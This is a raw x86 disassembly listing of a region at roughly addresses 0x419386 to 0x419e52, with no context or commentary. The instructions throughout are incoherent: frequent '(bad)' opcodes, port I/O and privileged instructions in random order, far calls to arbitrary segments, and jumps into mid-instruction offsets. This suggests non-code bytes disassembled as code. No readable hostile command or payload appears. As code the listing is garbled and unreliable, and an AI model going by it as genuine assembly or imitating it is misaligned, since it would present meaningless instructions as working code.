  419386:	adc    DWORD PTR [esi+0x6b],esp
  419389:	mov    dl,0x85
  41938b:	lods   al,BYTE PTR ds:[esi]
  41938c:	fisttp WORD PTR [eax-0x5379b16c]
  419392:	mov    bl,0xe6
  419394:	mov    bl,0xde
  419396:	jl     0x41938a
  419398:	inc    edi
  419399:	and    dl,BYTE PTR [edi+0x46]
  41939c:	(bad)  
  41939d:	jno    0x41936a
  41939f:	lea    ebx,[edi+0x409511f7]
  4193a5:	mov    cl,0x9b
  4193a7:	pop    edi
  4193a8:	jg     0x419372
  4193aa:	jnp    0x41934f
  4193ac:	call   0xea2b:0x5ee879cf
  4193b3:	xchg   esi,eax
  4193b4:	arpl   WORD PTR [ebx],bx
  4193b6:	es je  0x419359
  4193b9:	mov    ecx,0xf7b6b516
  4193be:	adc    BYTE PTR [ecx-0x3d6929c6],0x53
  4193c5:	lahf   
  4193c6:	push   ecx
  4193c7:	mov    DWORD PTR [ebp+0x77],esi
  4193ca:	std    
  4193cb:	xor    eax,0xb57d9dd2
  4193d0:	mov    bh,BYTE PTR [ebp-0x1c1976ec]
  4193d6:	stos   BYTE PTR es:[edi],al
  4193d7:	mov    al,0xa6
  4193d9:	idiv   edx
  4193db:	mov    eax,0xa0d4c83c
  4193e0:	test   BYTE PTR [ecx],dl
  4193e2:	(bad)  [ecx-0x18d1c874]
  4193e8:	inc    ecx
  4193e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193ea:	(bad)  [eax-0x3a]
  4193ed:	cmp    edx,edx
  4193ef:	out    dx,al
  4193f0:	mov    ecx,DWORD PTR [ebx+ebx*8-0x57]
  4193f4:	scas   eax,DWORD PTR es:[edi]
  4193f5:	inc    ebx
  4193f6:	push   edi
  4193f7:	adc    cl,BYTE PTR [edx]
  4193f9:	cmp    DWORD PTR [ecx+0x2e],ebx
  4193fc:	aaa    
  4193fd:	xor    ebp,DWORD PTR [ecx]
  4193ff:	dec    edx
  419400:	ins    DWORD PTR es:[edi],dx
  419401:	pop    eax
  419402:	dec    eax
  419403:	adc    ebx,DWORD PTR [edx+esi*1-0x2b]
  419407:	push   esi
  419408:	jmp    0xc5e35a28
  41940d:	pop    es
  41940e:	mov    eax,ds:0x9361b5b8
  419413:	adc    ecx,DWORD PTR [edi-0x4f]
  419416:	sbb    cl,BYTE PTR [ebp+eax*4+0x4832fb1d]
  41941d:	push   es
  41941e:	or     al,0x1c
  419420:	lods   al,BYTE PTR ds:[esi]
  419421:	sbb    eax,DWORD PTR [edi+ebx*1+0x6276698]
  419428:	push   0xffffffdd
  41942a:	xor    ecx,0x651282fb
  419430:	add    DWORD PTR [edi],ecx
  419432:	dec    eax
  419433:	hlt    
  419434:	setle  BYTE PTR [ecx-0x7bd3bf52]
  41943b:	xor    BYTE PTR [ecx+0x4d],0x6a
  41943f:	xor    BYTE PTR [esi+0x0],ah
	...
  4194b1:	add    BYTE PTR [eax],al
  4194b3:	add    BYTE PTR [ecx-0x7],al
  4194b6:	mov    ebx,ebx
  4194b8:	mov    ebx,0x95fb51fb
  4194bd:	fidivr WORD PTR [ebx+0x2c]
  4194c0:	test   DWORD PTR ds:0x1287ed4c,esi
  4194c6:	add    DWORD PTR [eax],eax
  4194c8:	cmc    
  4194c9:	add    BYTE PTR [eax],al
  4194cb:	add    BYTE PTR [eax],bl
  4194cd:	stos   DWORD PTR es:[edi],eax
  4194ce:	and    ebp,eax
  4194d0:	mov    bl,0x58
  4194d2:	int    0xaf
  4194d4:	add    DWORD PTR [edx-0x5a],edi
  4194d7:	push   ss
  4194d8:	cmc    
  4194d9:	xchg   edx,eax
  4194da:	mov    ah,0x41
  4194dc:	push   edx
  4194dd:	adc    ebx,DWORD PTR [ecx+0x3ffbefb9]
  4194e3:	pop    esp
  4194e4:	pop    ds
  4194e5:	or     eax,0x3d8e6112
  4194ea:	xlat   BYTE PTR ds:[ebx]
  4194eb:	aam    0xcc
  4194ed:	ret    0xcbd3
  4194f0:	mov    dh,0xbe
  4194f2:	out    0x3c,al
  4194f4:	enter  0x65f1,0xd3
  4194f8:	in     eax,0x9b
  4194fa:	test   BYTE PTR [eax+0x28b6f480],dh
  419500:	call   0x64e:0xd079603f
  419507:	daa    
  419508:	xor    BYTE PTR [eax-0x40bef864],0x8
  41950f:	add    bh,bh
  419511:	sahf   
  419512:	popf   
  419513:	lock xor eax,0xa4f7e2d8
  419519:	push   ebp
  41951a:	rcr    DWORD PTR [edx+0x7b],1
  41951d:	jnp    0x41957b
  41951f:	mov    al,ds:0x9ab6787f
  419524:	dec    edx
  419525:	jg     0x4194e6
  419527:	gs push eax
  419529:	xchg   ecx,eax
  41952a:	jmp    0x4194b3
  41952c:	or     ebp,DWORD PTR [ecx+0x30dc3a9]
  419532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419533:	(bad)  
  419534:	xchg   esi,eax
  419535:	adc    esi,esi
  419537:	psllq  mm1,mm3
  41953a:	lock out dx,eax
  41953c:	outs   dx,BYTE PTR ds:[esi]
  41953d:	aam    0x36
  41953f:	addr16 sub eax,0xf917ca86
  419545:	stos   DWORD PTR es:[edi],eax
  419546:	jge    0x419524
  419548:	inc    esp
  419549:	xchg   edi,eax
  41954a:	(bad)  
  41954b:	jg     0x419550
  41954d:	mov    ah,0xd9
  41954f:	(bad)  
  419550:	in     al,0xc6
  419552:	cdq    
  419553:	push   cs
  419554:	icebp  
  419555:	or     DWORD PTR [edi],esi
  419557:	push   DWORD PTR [edx+0x6666a85c]
  41955d:	add    ch,ch
  41955f:	psraw  mm3,QWORD PTR [ebx]
  419562:	add    esp,eax
  419564:	xor    dh,bl
  419566:	mov    esp,ds
  419568:	dec    esp
  419569:	fs call 0xdffc:0x69901141
  419571:	dec    edx
  419572:	int    0x59
  419574:	and    bh,dl
  419576:	adc    BYTE PTR [ebp+0x3b2fc865],dl
  41957c:	(bad)  
  41957d:	es mov esp,0xb0f5d7
  419583:	fadd   DWORD PTR [ecx+0x311240c8]
  419589:	mov    ah,0x2
  41958b:	or     edx,DWORD PTR [eax+0x42]
  41958e:	cmp    al,0x9
  419590:	and    eax,0xb64d2cf5
  419595:	(bad)  
  419596:	fndisi(8087 only) 
  419598:	int    0xed
  41959a:	stc    
  41959b:	jg     0x4195c3
  41959d:	enter  0xc735,0x4d
  4195a1:	loopne 0x41952b
  4195a3:	adc    al,0x16
  4195a5:	outs   dx,DWORD PTR ds:[esi]
  4195a6:	jns    0x4195b3
  4195a8:	arpl   dx,sp
  4195aa:	arpl   WORD PTR [eax-0x32],bp
  4195ad:	call   0xdc6a:0x2eb28d44
  4195b4:	stc    
  4195b5:	aam    0x93
  4195b7:	add    esp,DWORD PTR [edi+0x18867db4]
  4195bd:	mov    edx,0xc6af8b
	...
  419632:	add    BYTE PTR [eax],al
  419634:	xchg   ebx,eax
  419635:	sub    BYTE PTR [eax-0x604344c4],ah
  41963b:	scas   eax,DWORD PTR es:[edi]
  41963c:	jbe    0x4195eb
  41963e:	or     esp,DWORD PTR [eax+0x7d56387]
  419644:	jl     0x419659
  419646:	add    DWORD PTR [eax],eax
  419648:	cmc    
  419649:	add    BYTE PTR [eax],al
  41964b:	add    BYTE PTR [edx],bl
  41964d:	jmp    0x4195f8
  41964f:	pop    ebp
  419650:	call   0x3dd39bb2
  419655:	imul   edi,edi,0x36bdca8d
  41965b:	inc    ecx
  41965c:	icebp  
  41965d:	inc    ebp
  41965e:	arpl   WORD PTR [esi-0x3753cfff],di
  419664:	cmc    
  419665:	imul   esi,ecx,0x75bf9ca7
  41966b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41966c:	pop    edx
  41966d:	jmp    0x62cd:0xfd40d131
  419674:	xchg   esi,eax
  419675:	ins    BYTE PTR es:[edi],dx
  419676:	mov    ah,0xd4
  419678:	hlt    
  419679:	outs   dx,BYTE PTR ds:[esi]
  41967a:	or     DWORD PTR [eax+eax*1-0x4e19150a],ebx
  419681:	xor    al,dl
  419683:	add    edi,DWORD PTR [ebp+edx*1+0x36216eed]
  41968a:	jo     0x41961f
  41968c:	mov    esi,0x5243cda6
  419691:	imul   ebp,ebp,0x78
  419694:	pop    esi
  419695:	nop
  419696:	fcmovbe st,st(6)
  419698:	ret    0x4a69
  41969b:	mov    al,ds:0x8a13109e
  4196a0:	call   0x4514:0x6ef57a8c
  4196a7:	icebp  
  4196a8:	inc    esp
  4196a9:	in     al,0x58
  4196ab:	mov    ch,0xe3
  4196ad:	in     eax,dx
  4196ae:	push   esp
  4196af:	push   ebx
  4196b0:	mov    dh,0x55
  4196b2:	xchg   BYTE PTR ss:[eax],bl
  4196b5:	ret    
  4196b6:	cmp    DWORD PTR [esi-0x333e854f],ecx
  4196bc:	sti    
  4196bd:	xchg   ebp,eax
  4196be:	mov    ch,0xa7
  4196c0:	jno    0x4196c7
  4196c2:	shl    DWORD PTR [edi*8+0x49d44fea],0x8
  4196ca:	or     DWORD PTR ds:0xad22bbd0,eax
  4196d0:	sahf   
  4196d1:	xor    al,BYTE PTR [esi]
  4196d3:	mov    ch,0xa4
  4196d5:	xor    eax,edi
  4196d7:	not    DWORD PTR [edx]
  4196d9:	int3   
  4196da:	retf   0x97e9
  4196dd:	inc    edi
  4196de:	inc    esi
  4196df:	cmp    dh,BYTE PTR [esi-0x56]
  4196e2:	jno    0x4196ad
  4196e4:	jbe    0x419753
  4196e6:	jecxz  0x41968b
  4196e8:	mov    al,ds:0x4d950b53
  4196ed:	clc    
  4196ee:	fild   QWORD PTR [edi]
  4196f0:	push   ebx
  4196f1:	lds    ecx,FWORD PTR [ecx-0x28e6d883]
  4196f7:	mov    es,WORD PTR [ebx+0x4bd4979]
  4196fd:	push   0x69d07093
  419702:	pop    es
  419703:	push   ecx
  419704:	repz jns 0x4196d0
  419707:	dec    ebp
  419708:	pop    ds
  419709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41970a:	inc    esi
  41970b:	mov    bh,0xf2
  41970d:	ds stos BYTE PTR es:[edi],al
  41970f:	jns    0x4196e8
  419711:	mov    esi,0x6da217f9
  419716:	scas   al,BYTE PTR es:[edi]
  419717:	pusha  
  419718:	retf   0xf321
  41971b:	ins    BYTE PTR es:[edi],dx
  41971c:	pop    edi
  41971d:	and    eax,0xbc5b6528
  419722:	push   esi
  419723:	sahf   
  419724:	xchg   edx,eax
  419725:	inc    ebx
  419726:	inc    eax
  419727:	ds jb  0x41977e
  41972a:	outs   dx,BYTE PTR ds:[esi]
  41972b:	pop    esi
  41972c:	js     0x419715
  41972e:	pop    edx
  41972f:	inc    esp
  419730:	sbb    al,0xee
  419732:	push   esp
  419733:	mov    dh,0x38
  419735:	cmp    esp,DWORD PTR [eax+0x13]
  419738:	dec    edi
  419739:	xor    ch,BYTE PTR [edx+0x47eeb20d]
  41973f:	dec    ebp
  419740:	popa   
	...
  4197b1:	add    BYTE PTR [eax],al
  4197b3:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4197ba:	hlt    
  4197bb:	fist   WORD PTR [ecx-0x50d83417]
  4197c1:	retf   0xdfce
  4197c4:	jno    0x4197da
  4197c6:	add    DWORD PTR [eax],eax
  4197c8:	cmc    
  4197c9:	add    BYTE PTR [eax],al
  4197cb:	add    BYTE PTR [ecx],cl
  4197cd:	jg     0x419824
  4197cf:	push   edx
  4197d0:	mov    WORD PTR [ebp-0x9e31264],es
  4197d6:	mov    gs,WORD PTR [edi+0x35dae870]
  4197dc:	sahf   
  4197dd:	mov    dl,0x6b
  4197df:	dec    eax
  4197e0:	sbb    al,0x8b
  4197e2:	xlat   BYTE PTR ds:[ebx]
  4197e3:	xchg   edi,eax
  4197e4:	sbb    BYTE PTR [edx+edx*4-0x27a0a6f2],ah
  4197eb:	pop    esi
  4197ec:	jbe    0x4197cb
  4197ee:	mov    edx,0x10afb969
  4197f3:	inc    edx
  4197f4:	pop    ebp
  4197f5:	pop    ebp
  4197f6:	dec    edx
  4197f7:	xchg   DWORD PTR es:[eax-0x4b],ebx
  4197fb:	(bad)  
  4197fc:	mov    ah,0xdc
  4197fe:	fldcw  WORD PTR [ebx-0x4e2f0f0c]
  419804:	mov    bl,0xc1
  419806:	and    DWORD PTR [ebx+0xc],esi
  419809:	sub    BYTE PTR [ebp-0xca3db60],al
  41980f:	sbb    dh,al
  419811:	jge    0x419813
  419813:	sub    al,0x43
  419815:	jg     0x41980d
  419817:	ins    DWORD PTR es:[edi],dx
  419818:	fmul   QWORD PTR ds:0x44edac2e
  41981e:	repz push esi
  419820:	pusha  
  419821:	mov    eax,ds:0x58c8bfd
  419826:	jb     0x4197dd
  419828:	stc    
  419829:	and    esi,DWORD PTR [edi+ebp*1]
  41982c:	mov    eax,ds:0x3ab751ec
  419831:	mov    esi,0x9447ccee
  419836:	ss aam 0x6
  419839:	fistp  QWORD PTR [ebp+0x1dc864f0]
  41983f:	pop    edx
  419840:	cwde   
  419841:	mov    ds:0x5c90886c,al
  419846:	aad    0xef
  419848:	and    dl,bh
  41984a:	fscale 
  41984c:	pop    ebp
  41984d:	push   ebx
  41984e:	or     ebx,ebx
  419850:	test   DWORD PTR [esi+edx*8],0xf1852ad0
  419857:	mov    al,ds:0x9479b596
  41985c:	adc    al,0x59
  41985e:	push   esp
  41985f:	push   cs
  419860:	sub    edx,DWORD PTR [edx]
  419862:	jne    0x419859
  419864:	or     ecx,DWORD PTR [edx+0x3a4bf10e]
  41986a:	add    DWORD PTR [ebx-0x21],eax
  41986d:	add    eax,0x29464bec
  419872:	add    bh,BYTE PTR [eax-0x6f41eed2]
  419878:	xlat   BYTE PTR ds:[ebx]
  419879:	arpl   WORD PTR [ebp-0x120f310e],cx
  41987f:	pop    ss
  419880:	push   ecx
  419881:	fucomp st(0)
  419883:	pushf  
  419884:	cmp    dh,BYTE PTR [ecx+0x69298329]
  41988a:	fwait
  41988b:	mul    BYTE PTR [bx]
  41988e:	push   edx
  41988f:	cld    
  419890:	sub    al,0xdb
  419892:	sahf   
  419893:	and    al,0xfe
  419895:	mov    eax,0x41c8bee2
  41989a:	mov    esi,0xd96f6961
  41989f:	nop
  4198a0:	mov    WORD PTR [ebp-0x17],?
  4198a3:	mov    dl,0xda
  4198a5:	xchg   BYTE PTR [edi+0x5d],dl
  4198a8:	xor    eax,0xe12191c
  4198ad:	sub    eax,0x2a01a0bf
  4198b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198b3:	mov    ch,0xc8
  4198b5:	cmp    eax,0x32faf21a
  4198ba:	mov    dl,0x97
  4198bc:	dec    eax
  4198bd:	stos   DWORD PTR es:[edi],eax
  4198be:	sbb    edi,ebp
  4198c0:	pop    ebx
	...
  419931:	add    BYTE PTR [eax],al
  419933:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  41993a:	into   
  41993b:	fwait
  41993c:	test   BYTE PTR [ecx-0x28],0x94
  419940:	inc    DWORD PTR [esi-0x18]
  419943:	les    esp,FWORD PTR [esi+0x15]
  419946:	add    DWORD PTR [eax],eax
  419948:	cmc    
  419949:	add    BYTE PTR [eax],al
  41994b:	add    BYTE PTR [ebp-0x47],bh
  41994e:	pop    edx
  41994f:	mov    al,0x6f
  419951:	mov    al,ds:0x1692abbb
  419956:	dec    edx
  419957:	push   edx
  419958:	xchg   ebp,eax
  419959:	movd   mm6,DWORD PTR [eax+0x73]
  41995d:	push   esp
  41995e:	cmp    BYTE PTR [edi-0x71],0x9f
  419962:	add    edi,DWORD PTR fs:[ebx]
  419965:	mov    ebp,0x621596b5
  41996a:	call   0x152b:0xd6c51421
  419971:	and    al,0xa2
  419973:	es push edx
  419975:	adc    DWORD PTR [edx-0x73ed6574],ecx
  41997b:	(bad)  
  41997d:	add    DWORD PTR [esi],edi
  41997f:	pop    ebx
  419980:	add    al,0x69
  419982:	jb     0x419909
  419984:	xlat   BYTE PTR ds:[ebx]
  419985:	adc    DWORD PTR [ebp-0x5521cfc6],0xffffff88
  41998c:	fadd   DWORD PTR [esi+0x48]
  41998f:	int3   
  419990:	jae    0x4199f3
  419992:	retf   0xc78
  419995:	mov    dh,0x40
  419997:	dec    edx
  419998:	push   es
  419999:	inc    edi
  41999a:	jmp    0x419a17
  41999c:	xchg   ebx,eax
  41999d:	xchg   esp,esi
  41999f:	test   eax,0xf4981fb8
  4199a4:	(bad)  
  4199a5:	mov    bl,dl
  4199a7:	lea    esi,[esi+0x2cc75330]
  4199ad:	test   DWORD PTR [ecx-0x80],ecx
  4199b0:	aam    0x1f
  4199b2:	and    bl,BYTE PTR [esp+edi*1]
  4199b5:	xchg   ecx,eax
  4199b6:	outs   dx,DWORD PTR ds:[esi]
  4199b7:	data16 or ch,BYTE PTR [edi+ebp*4]
  4199bb:	jnp    0x41997a
  4199bd:	call   0x32b4:0xe1cd0b46
  4199c4:	ins    DWORD PTR es:[edi],dx
  4199c5:	fstp   DWORD PTR [ebp+0x549b2570]
  4199cb:	mov    esi,0x9a21d35a
  4199d0:	jg     0x4199a8
  4199d2:	out    dx,al
  4199d3:	call   0x8293:0x9c87440b
  4199da:	push   0x9
  4199dc:	nop
  4199dd:	mov    fs,esi
  4199df:	mov    ds:0xda2f7b25,al
  4199e4:	pop    es
  4199e5:	sub    al,0x4f
  4199e7:	iret   
  4199e8:	sub    al,0xfe
  4199ea:	inc    esi
  4199eb:	and    BYTE PTR [ecx+0x4e4900f4],al
  4199f1:	adc    al,0x2d
  4199f3:	and    ch,BYTE PTR [edi+ebx*4]
  4199f6:	xchg   edi,eax
  4199f7:	add    dh,cl
  4199f9:	cli    
  4199fa:	xor    BYTE PTR [esi],ah
  4199fc:	push   eax
  4199fd:	out    dx,al
  4199fe:	xlat   BYTE PTR ds:[ebx]
  4199ff:	mov    eax,ds:0xf9f3999a
  419a04:	sti    
  419a05:	xor    al,ah
  419a07:	add    al,BYTE PTR [edi+0x24]
  419a0a:	and    ebp,DWORD PTR [edi]
  419a0c:	sbb    eax,0xa832fa2f
  419a11:	mov    al,ds:0xff8a1d63
  419a16:	xor    cl,BYTE PTR [ecx-0x51216c0c]
  419a1c:	jle    0x419a7e
  419a1e:	shl    BYTE PTR ds:0x806a7180,cl
  419a24:	gs nop
  419a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a27:	or     BYTE PTR [ebx-0xb],cl
  419a2a:	mov    ebx,0xe654cca0
  419a2f:	mov    ss,WORD PTR [eax+0x7aa5ae46]
  419a35:	adc    ch,bl
  419a37:	nop
  419a38:	jbe    0x419a06
  419a3a:	and    dl,al
  419a3c:	das    
  419a3d:	xchg   DWORD PTR [edx+0xa183],eax
	...
  419ab3:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  419ab7:	xor    ch,bh
  419ab9:	mov    dh,0xff
  419abb:	pop    edi
  419abc:	mov    ebp,0x58357b47
  419ac1:	(bad)  
  419ac2:	sub    eax,0x1165ba3
  419ac7:	add    ch,dh
  419ac9:	add    BYTE PTR [eax],al
  419acb:	add    BYTE PTR [eax+eax*2-0x38],bl
  419acf:	test   DWORD PTR [esi+0x3d8460b5],edi
  419ad5:	ret    0x5886
  419ad8:	push   ds
  419ad9:	dec    esp
  419ada:	jno    0x419ac4
  419adc:	jb     0x419a92
  419ade:	push   esp
  419adf:	cli    
  419ae0:	adc    DWORD PTR [ebx+0x51009d7e],edx
  419ae6:	adc    ch,BYTE PTR [eax-0x6a]
  419ae9:	xor    al,0x9c
  419aeb:	imul   ebx,ebx,0xd90d5798
  419af1:	cmp    DWORD PTR [ebx-0x3c1aac6e],esp
  419af7:	out    dx,al
  419af8:	fldcw  WORD PTR [edi-0x3a]
  419afb:	cs iret 
  419afd:	sti    
  419afe:	shl    BYTE PTR ds:0x8b9e503,0x1
  419b05:	mov    esi,DWORD PTR [ebx-0x31c3ceac]
  419b0b:	jnp    0x419a9a
  419b0d:	rol    BYTE PTR [edx+0x5f],1
  419b10:	jle    0x419b91
  419b12:	inc    eax
  419b13:	sub    BYTE PTR [ecx-0xd],0xc1
  419b17:	addr16 (bad) 
  419b19:	test   DWORD PTR [ebx-0x65],0xa649cff5
  419b20:	xchg   edi,eax
  419b21:	ficom  DWORD PTR [eax-0x5c]
  419b24:	lods   al,BYTE PTR ds:[esi]
  419b25:	dec    ecx
  419b26:	jbe    0x419ad9
  419b28:	add    DWORD PTR [esi+0x31],esi
  419b2b:	adc    BYTE PTR ds:0x285a0c1d,ah
  419b31:	mul    DWORD PTR [esi-0x3]
  419b34:	imul   esp,ecx,0x1ecf25b5
  419b3a:	jl     0x419afb
  419b3c:	and    dh,bl
  419b3e:	adc    ah,bh
  419b40:	pop    ebp
  419b41:	test   DWORD PTR [edx+0x50da2712],esp
  419b47:	ja     0x419ae0
  419b49:	xchg   ebx,eax
  419b4a:	pop    ecx
  419b4b:	dec    edi
  419b4c:	jle    0x419b0f
  419b4e:	shl    DWORD PTR ds:0x5be7f997,0x3b
  419b55:	cwde   
  419b56:	call   0x6ed5e4e
  419b5b:	fs out 0x4d,eax
  419b5e:	mov    cl,BYTE PTR [ecx+eiz*8+0x271a1395]
  419b65:	dec    esp
  419b66:	xlat   BYTE PTR ds:[ebx]
  419b67:	fdivr  QWORD PTR [ebp-0x21]
  419b6a:	sti    
  419b6b:	sbb    DWORD PTR [esi+0x4629d57a],edx
  419b71:	or     ah,bh
  419b73:	lods   eax,DWORD PTR ds:[esi]
  419b74:	xlat   BYTE PTR ds:[ebx]
  419b75:	cmp    esp,esi
  419b77:	sbb    bh,BYTE PTR [edi-0x4c]
  419b7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b7b:	jae    0x419bc8
  419b7d:	adc    DWORD PTR [ebp+0x2f],esp
  419b80:	pop    ebx
  419b81:	jo     0x419b59
  419b83:	das    
  419b84:	adc    al,BYTE PTR [edx]
  419b86:	out    0x8f,eax
  419b88:	imul   ecx,DWORD PTR [ebp+0x46],0xf8c9c1f3
  419b8f:	sub    eax,0x4e26b10d
  419b94:	(bad)
  419b97:	bound  eax,QWORD PTR [eax]
  419b99:	add    ah,BYTE PTR [eax+0x7985acf0]
  419b9f:	out    dx,al
  419ba0:	mov    bh,0xbd
  419ba2:	sbb    esp,DWORD PTR [eax+0x29]
  419ba5:	jbe    0x419b5c
  419ba7:	mov    ds:0x77c7125b,al
  419bac:	popf   
  419bad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bae:	add    edx,ecx
  419bb0:	ja     0x419c29
  419bb2:	sbb    bl,bh
  419bb4:	daa    
  419bb5:	pop    esp
  419bb6:	pop    ss
  419bb7:	push   edx
  419bb8:	fdivr  QWORD PTR [ebx+eiz*1+0x73]
  419bbc:	mov    ?,WORD PTR [ebp+0x944393]
	...
  419c32:	add    BYTE PTR [eax],al
  419c34:	sti    
  419c35:	inc    edx
  419c36:	out    dx,al
  419c37:	aas    
  419c38:	(bad)  
  419c39:	mov    edi,0x157c6fb
  419c3e:	sub    esi,0xffffffcb
  419c41:	add    dh,cl
  419c43:	sbb    edx,DWORD PTR [eax+0x17]
  419c46:	add    DWORD PTR [eax],eax
  419c48:	cmc    
  419c49:	add    BYTE PTR [eax],al
  419c4b:	add    cl,al
  419c4d:	jg     0x419cac
  419c4f:	in     al,dx
  419c50:	loopne 0x419c4a
  419c52:	leave  
  419c53:	or     BYTE PTR [esi+esi*4-0x4b],bh
  419c57:	ins    BYTE PTR es:[edi],dx
  419c58:	popa   
  419c59:	gs xchg esi,eax
  419c5b:	mov    edi,DWORD PTR [esi+esi*2]
  419c5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c5f:	sub    ah,BYTE PTR [edi-0x3fda6e0b]
  419c65:	inc    esi
  419c66:	and    DWORD PTR [esi+0x6ca2de13],ebx
  419c6c:	dec    edi
  419c6d:	in     al,0x82
  419c6f:	push   cs
  419c70:	adc    al,BYTE PTR [ecx+eax*2+0x6b]
  419c74:	cs jmp 0x419c38
  419c77:	clc    
  419c78:	sbb    eax,0x90a802c3
  419c7d:	sti    
  419c7e:	in     eax,dx
  419c7f:	or     bh,BYTE PTR [ebx-0x5f]
  419c82:	stos   BYTE PTR es:[edi],al
  419c83:	in     al,dx
  419c84:	dec    edx
  419c85:	sub    eax,0x13531e4f
  419c8a:	xchg   ebp,eax
  419c8b:	stos   BYTE PTR es:[edi],al
  419c8c:	mov    dl,0xcc
  419c8e:	mov    bl,0x31
  419c90:	aad    0xaa
  419c92:	fidivr WORD PTR [edi-0x7eeafb31]
  419c98:	cmp    eax,0xe1a0ebeb
  419c9d:	mov    ah,0x6e
  419c9f:	and    DWORD PTR [edi-0x6],ebx
  419ca2:	int3   
  419ca3:	aas    
  419ca4:	jmp    0xd197f063
  419ca9:	add    edx,0xffffffb5
  419cac:	and    edi,esi
  419cae:	mov    ah,BYTE PTR [ebx]
  419cb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cb1:	arpl   WORD PTR [ebp+0x61b9920f],sp
  419cb7:	js     0x419cc6
  419cb9:	mov    ah,0x27
  419cbb:	mov    ah,al
  419cbd:	out    dx,eax
  419cbe:	adc    BYTE PTR [eax+0x17],bl
  419cc1:	push   cs
  419cc2:	data16 jecxz 0x419cb8
  419cc5:	retf   0xd352
  419cc8:	push   cs
  419cc9:	jno    0x419ca8
  419ccb:	or     eax,DWORD PTR [esi+0x70]
  419cce:	cmp    BYTE PTR [eax+0x7b],ah
  419cd1:	jmp    0xd168d5b
  419cd6:	into   
  419cd7:	sbb    ebp,esp
  419cd9:	(bad)  
  419cda:	out    dx,eax
  419cdb:	push   0x7b
  419cdd:	push   ecx
  419cde:	cmp    bh,BYTE PTR [ecx+0x6da7c414]
  419ce4:	sbb    BYTE PTR [esi+0x5a],bl
  419ce7:	ss xor esp,esi
  419cea:	xchg   DWORD PTR [eax+0x334def44],ebx
  419cf0:	cmp    al,0x61
  419cf2:	scas   eax,DWORD PTR es:[edi]
  419cf3:	imul   ecx,DWORD PTR [ecx-0x38],0xfa734974
  419cfa:	fucomi st,st(3)
  419cfc:	ins    BYTE PTR es:[edi],dx
  419cfd:	cmp    esp,ebx
  419cff:	hlt    
  419d00:	sbb    BYTE PTR [eax],0x86
  419d03:	out    dx,al
  419d04:	(bad)  
  419d05:	or     eax,0xbc7ac2c3
  419d0a:	mov    ds:0x70a8e49e,al
  419d0f:	(bad)  [esi+0x53]
  419d12:	aaa    
  419d13:	mov    ds:0x3794564d,al
  419d18:	fdivr  QWORD PTR [ebx-0x34]
  419d1b:	push   esp
  419d1c:	pop    ebp
  419d1d:	icebp  
  419d1e:	mov    bh,0x6b
  419d20:	stos   BYTE PTR es:[edi],al
  419d21:	das    
  419d22:	lahf   
  419d23:	icebp  
  419d24:	xchg   ecx,eax
  419d25:	mov    DWORD PTR [edi+eiz*8],eax
  419d28:	dec    eax
  419d29:	inc    edx
  419d2a:	pop    ds
  419d2b:	xchg   BYTE PTR [ebx-0x80],ah
  419d2e:	push   esp
  419d2f:	mov    edi,edx
  419d31:	(bad)  [ecx-0x4a226293]
  419d37:	mov    ds:0xa0db7b51,eax
  419d3c:	mov    fs:0x8c6858,al
	...
  419db2:	add    BYTE PTR [eax],al
  419db4:	push   cs
  419db5:	bnd call 0xde7c99eb
  419dbb:	(bad)  
  419dbc:	jp     0x419e27
  419dbe:	xchg   edi,eax
  419dbf:	inc    esp
  419dc0:	pop    ss
  419dc1:	dec    edx
  419dc2:	mov    esp,DWORD PTR [edi]
  419dc4:	inc    ebp
  419dc5:	sbb    BYTE PTR [ecx],al
  419dc7:	add    ch,dh
  419dc9:	add    BYTE PTR [eax],al
  419dcb:	add    BYTE PTR [esp+ecx*4+0x3a1a0487],ch
  419dd2:	test   BYTE PTR [edx],ch
  419dd4:	push   ecx
  419dd5:	fs ins BYTE PTR es:[edi],dx
  419dd7:	add    BYTE PTR [edx-0x4841bcae],cl
  419ddd:	js     0x419e14
  419ddf:	adc    al,0x4a
  419de1:	dec    edi
  419de2:	mov    ebp,0xdfe24c83
  419de7:	inc    edi
  419de8:	sbb    DWORD PTR [esi+eax*2+0x7dc67b59],ebx
  419def:	clc    
  419df0:	pushf  
  419df1:	sbb    BYTE PTR [ecx],0xa5
  419df4:	adc    BYTE PTR [edi-0x3721cf3e],bl
  419dfa:	pop    edx
  419dfb:	int    0x86
  419dfd:	inc    edi
  419dfe:	xchg   DWORD PTR [edi+eax*4],edi
  419e01:	or     DWORD PTR [edx+esi*2],0xffffffc7
  419e05:	leave  
  419e06:	retf   
  419e07:	repz push esi
  419e09:	ins    BYTE PTR es:[edi],dx
  419e0a:	jb     0x419e51
  419e0c:	lods   al,BYTE PTR ds:[esi]
  419e0d:	ins    DWORD PTR es:[edi],dx
  419e0e:	inc    ebx
  419e0f:	pop    ebx
  419e10:	imul   esp,ecx,0x14490484
  419e16:	sub    DWORD PTR [edi],ecx
  419e18:	(bad)  
  419e19:	xor    eax,0x16addf3
  419e1e:	(bad)  
  419e1f:	rcl    BYTE PTR [ecx+0xa],cl
  419e22:	sbb    BYTE PTR [edx+0x7d8e0da6],dh
  419e28:	xchg   esi,eax
  419e29:	sbb    cl,BYTE PTR [bx+di-0x1db8]
  419e2e:	ss xchg esi,eax
  419e30:	(bad)  
  419e31:	out    dx,eax
  419e32:	push   0xdd8e6bb
  419e37:	and    ch,BYTE PTR ds:0x69c2f5d7
  419e3d:	retf   
  419e3e:	test   DWORD PTR [edx+0x3b],eax
  419e41:	std    
  419e42:	les    ebx,FWORD PTR [edi+0x69]
  419e45:	inc    eax
  419e46:	dec    esp
  419e47:	retf   0xc511
  419e4a:	mov    dl,0xc2
  419e4c:	sbb    BYTE PTR [esi-0x56],al
  419e4f:	daa    
  419e50:	mov    dh,0x9a
  419e52:	pop    es
